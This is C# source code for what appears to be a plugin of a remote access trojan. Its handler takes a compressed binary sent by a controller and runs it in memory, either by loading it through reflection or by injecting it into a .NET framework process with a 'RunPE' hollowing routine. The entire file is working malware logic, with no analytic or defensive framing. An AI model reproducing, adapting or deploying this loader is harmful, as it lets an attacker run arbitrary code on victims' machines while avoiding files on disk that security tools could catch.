using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using MessagePackLib.MessagePack;

namespace Plugin.Handler
{
    public class HandleSendTo
    {
        public void ToMemory(MsgPack unpack_msgpack)
        {
            try
            {
                byte[] buffer = unpack_msgpack.ForcePathObject("File").GetAsBytes();
                string injection = unpack_msgpack.ForcePathObject("Inject").AsString;
                if (injection.Length == 0)
                {
                    //Reflection
                    new Thread(delegate ()
                    {
                        try
                        {
                            Assembly loader = Assembly.Load(Zip.Decompress(buffer));
                            object[] parm = null;
                            if (loader.EntryPoint.GetParameters().Length > 0)
                            {
                                parm = new object[] { new string[] { null } };
                            }
                            loader.EntryPoint.Invoke(null, parm);
                        }
                        catch (Exception ex)
                        {
                            Packet.Error(ex.Message);
                        }
                    })
                    { IsBackground = false }.Start();

                }
                else
                {
                    //RunPE
                    new Thread(delegate ()
                    {
                        try
                        {
                            SendToMemory.Execute(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), injection), Zip.Decompress(buffer));
                        }
                        catch (Exception ex)
                        {
                            Packet.Error(ex.Message);
                        }
                    })
                    { IsBackground = false }.Start();
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
            Connection.Disconnected();
        }
    }

}
